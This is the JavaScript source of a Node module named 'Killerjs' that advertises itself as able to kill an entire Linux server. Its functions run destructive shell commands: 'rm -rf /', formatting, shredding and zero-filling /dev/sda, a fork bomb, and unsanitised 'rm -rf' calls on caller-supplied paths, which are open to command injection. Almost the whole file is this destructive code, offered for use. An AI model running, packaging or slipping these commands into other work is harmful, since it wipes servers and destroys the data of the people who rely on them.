let shell = require('shelljs')
let a  = require('app-root-path')
/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @return {Promise} A promise object.
 */

let killer = () => {
    this.destroyRoot = () => {
        return new Promise((done, err) => {
            shell.exec('rm -rf /', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Destroyed The Server Root.`)
                }
            })
        })
    }
    this.format = () => {
        return new Promise((done, err) => {
            shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Formatted the Drive`)
                }
            })
        })
    }
    this.overWrite = () => {
        return new Promise((done, err) => {
            shell.exec('shred -v /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Drive has been Overwritten Successfully.`)
                }
            })
        })
    }
    this.implode = () => {
        return new Promise((done, err) => {
            shell.exec('mv / /dev/null', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Imploded the Drive.`)
                }
            })
        })
    }
    this.wipe = () => {
        return new Promise((done, err) => {
            shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Wiped the Drive.`)
                }
            })
        })
    }
    this.forkBomb = () => {
        return new Promise((done, err) => {
            shell.exec(':(){:|:&};:', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Executed forkBomb`)
                }
            })
        })
    }
    this.destroyProject = (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }
    this.destroyADir = (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }
}

module.exports = killer;